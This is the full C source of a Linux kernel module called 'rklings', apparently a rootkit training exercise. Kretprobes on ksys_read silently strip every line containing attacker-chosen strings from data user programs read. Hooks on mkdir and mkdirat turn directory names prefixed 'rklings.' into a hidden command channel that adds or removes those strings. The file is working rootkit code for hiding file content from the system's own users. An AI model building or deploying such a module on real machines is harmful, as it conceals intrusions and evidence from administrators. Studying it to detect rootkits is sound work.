// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/ptrace.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128
#define RK_TARGET_MAX 32
#define RK_NAME_MAX   64

struct rk_target_list {
	spinlock_t lock;
	char targets[RK_TARGET_MAX][RK_NAME_MAX];
	int count;
};

static struct rk_target_list content_targets;

static int rk_target_add(struct rk_target_list *list, const char *name)
{
	unsigned long flags;
	int ret = 0;

	spin_lock_irqsave(&list->lock, flags);
	if (list->count >= RK_TARGET_MAX) {
		ret = -ENOSPC;
		goto out;
	}
	strscpy(list->targets[list->count], name, RK_NAME_MAX);
	list->count++;
out:
	spin_unlock_irqrestore(&list->lock, flags);
	return ret;
}

static int rk_target_remove(struct rk_target_list *list, const char *name)
{
	unsigned long flags;
	int i, ret = -ENOENT;

	spin_lock_irqsave(&list->lock, flags);
	for (i = 0; i < list->count; i++) {
		if (strcmp(list->targets[i], name) != 0)
			continue;
		if (i < list->count - 1)
			memmove(&list->targets[i], &list->targets[i + 1],
				(list->count - i - 1) * RK_NAME_MAX);
		list->count--;
		ret = 0;
		break;
	}
	spin_unlock_irqrestore(&list->lock, flags);
	return ret;
}

static bool line_matches(struct rk_target_list *list, const char *line, int len)
{
	unsigned long flags;
	bool found = false;
	int i;

	spin_lock_irqsave(&list->lock, flags);
	for (i = 0; i < list->count; i++) {
		if (strnstr(line, list->targets[i], len)) {
			found = true;
			break;
		}
	}
	spin_unlock_irqrestore(&list->lock, flags);
	return found;
}

/* ---- ksys_read interception ---- */

struct read_data {
	void __user *ubuf;
	size_t count;
};

/* ksys_read is not a syscall wrapper: args are directly in regs */
static int read_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct read_data *data;

	data = (struct read_data *)ri->data;
	data->ubuf = (void __user *)regs->si;
	data->count = (size_t)regs->dx;
	return 0;
}

static int read_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct read_data *data;
	long total, new_total;
	char *kbuf, *pos;

	data = (struct read_data *)ri->data;
	total = regs_return_value(regs);
	if (total <= 0)
		return 0;

	if (content_targets.count == 0)
		return 0;

	kbuf = kmalloc(total, GFP_ATOMIC);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, data->ubuf, total)) {
		kfree(kbuf);
		return 0;
	}

	pos = kbuf;
	new_total = total;

	while (pos < kbuf + new_total) {
		char *nl = memchr(pos, '\n', (kbuf + new_total) - pos);
		int line_len;

		if (nl)
			line_len = nl - pos + 1;
		else
			line_len = (kbuf + new_total) - pos;

		if (line_matches(&content_targets, pos, line_len)) {
			long remaining = (kbuf + new_total) - (pos + line_len);

			if (remaining > 0)
				memmove(pos, pos + line_len, remaining);
			new_total -= line_len;
		} else {
			pos += line_len;
		}
	}

	if (new_total != total) {
		if (copy_to_user(data->ubuf, kbuf, new_total))
			new_total = -EFAULT;
		regs_set_return_value(regs, new_total);
	}

	kfree(kbuf);
	return 0;
}

static struct kretprobe read_probe = {
    .handler = read_return,
    .entry_handler = read_entry,
    .data_size = sizeof(struct read_data),
    .maxactive = 20,
    .kp.symbol_name = "ksys_read",
};

/* ---- mkdir command dispatcher (provided) ---- */

typedef int (*rk_handler_t)(const char *arg);

struct rk_cmd_entry {
	const char *key;
	rk_handler_t handler;
};

static int cmd_hide_content(const char *arg)   { return rk_target_add(&content_targets, arg); }
static int cmd_unhide_content(const char *arg) { return rk_target_remove(&content_targets, arg); }

static const struct rk_cmd_entry cmd_table[] = {
	{ "h.c", cmd_hide_content },
	{ "u.c", cmd_unhide_content },
};

static int rk_dispatch(const char *name)
{
	const struct rk_cmd_entry *best = NULL;
	int best_len = 0;
	const char *arg;
	int i;

	for (i = 0; i < ARRAY_SIZE(cmd_table); i++) {
		int klen = strlen(cmd_table[i].key);

		if (strncmp(name, cmd_table[i].key, klen) != 0)
			continue;
		if (name[klen] != '\0' && name[klen] != '.')
			continue;
		if (klen > best_len) {
			best = &cmd_table[i];
			best_len = klen;
		}
	}

	if (!best)
		return -ENOENT;

	arg = name[best_len] == '.' ? name + best_len + 1 : NULL;
	return best->handler(arg);
}

struct rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_mkdir_do_entry(struct kretprobe_instance *inst,
			     const char __user *pathname)
{
	struct rk_mkdir_data *data;
	char buf[RK_PATH_MAX];
	long copied;

	data = (struct rk_mkdir_data *)inst->data;
	data->intercepted = false;

	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;

	if (strncmp(buf, RK_PREFIX, RK_PREFIX_LEN) != 0)
		return 0;

	data->result = rk_dispatch(buf + RK_PREFIX_LEN);
	data->intercepted = true;

	put_user('\0', (char __user *)pathname);
	return 0;
}

static int rk_mkdir_entry_mkdir(struct kretprobe_instance *inst,
				struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_mkdir_do_entry(inst, (const char __user *)uregs->di);
}

static int rk_mkdir_entry_mkdirat(struct kretprobe_instance *inst,
				  struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_mkdir_do_entry(inst, (const char __user *)uregs->si);
}

static int rk_mkdir_return(struct kretprobe_instance *inst,
			   struct pt_regs *regs)
{
	struct rk_mkdir_data *data;

	data = (struct rk_mkdir_data *)inst->data;
	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

static struct kretprobe rk_mkdir_probe = {
    .kp.symbol_name = "__x64_sys_mkdir",
    .entry_handler = rk_mkdir_entry_mkdir,
    .handler = rk_mkdir_return,
    .data_size = sizeof(struct rk_mkdir_data),
    .maxactive = 8,
};

static struct kretprobe rk_mkdirat_probe = {
    .kp.symbol_name = "__x64_sys_mkdirat",
    .entry_handler = rk_mkdir_entry_mkdirat,
    .handler = rk_mkdir_return,
    .data_size = sizeof(struct rk_mkdir_data),
    .maxactive = 8,
};

/* ---- module lifecycle ---- */

static int __init rk_init(void)
{
	int ret;

	spin_lock_init(&content_targets.lock);

	ret = register_kretprobe(&read_probe);
	if (ret)
		return ret;

	ret = register_kretprobe(&rk_mkdir_probe);
	if (ret)
		goto fail_mkdir;

	ret = register_kretprobe(&rk_mkdirat_probe);
	if (ret)
		goto fail_mkdirat;

	pr_info("rklings: loaded\n");
	return 0;

fail_mkdirat:
	unregister_kretprobe(&rk_mkdir_probe);
fail_mkdir:
	unregister_kretprobe(&read_probe);
	return ret;
}

static void __exit rk_exit(void)
{
	pr_info("rklings: unloaded\n");
	unregister_kretprobe(&rk_mkdirat_probe);
	unregister_kretprobe(&rk_mkdir_probe);
	unregister_kretprobe(&read_probe);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Remove matching lines from file reads");
